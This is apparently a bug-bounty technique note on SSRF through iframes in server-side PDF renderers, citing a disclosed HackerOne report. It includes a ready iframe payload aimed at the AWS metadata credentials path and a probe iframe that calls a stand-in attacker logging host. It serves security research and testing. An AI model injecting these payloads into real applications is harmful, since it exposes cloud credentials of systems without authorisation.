---
title: AWS IMDS via iframe in server-side PDF render
slug: aws-imds-iframe-pdf
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/ssrf]
inbound: []
---

# AWS IMDS via iframe in PDF renderer

## Pattern
Server-side PDF renderer (HackerOne analytics, custom report builder,
invoice generator) accepts user-controlled HTML in template fields.
Inject `<iframe src="http://169.254.169.254/...">` to fetch IMDSv1 →
AWS credentials. $25K crit on HackerOne's own analytics report (Dec 8
2023 disclosed).

## Preconditions
- Server-side HTML → PDF rendering with user-controlled template content.
- AWS-hosted, IMDSv1 reachable (no token requirement).

## Detection
- Render `<iframe src="http://attacker/log">` and confirm hit on attacker
  log.
- Then escalate to `169.254.169.254`.

## Triggering
```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
```
PDF embeds the response. Open PDF → read iframe content as text/image.

For IMDSv2 (token required): chain with token-mint via PUT — usually
blocked by HTTP method restriction in headless renderer. Most prod
clusters still default to IMDSv1.

## Related
- [[headless-browser-html-ssrf]] (parent class)
- Reminder: ping triagers immediately after submitting SSRF — HackerOne
  $25K crit was time-limited (window-of-opportunity bonus).

## Seen in the wild
- HackerOne analytics PDF SSRF — $25K crit, Dec 8 2023.
- Critical Thinking Podcast Ep 51.

## References
- Critical Thinking Podcast Ep 51
- HackerOne disclosed report (Dec 8 2023)
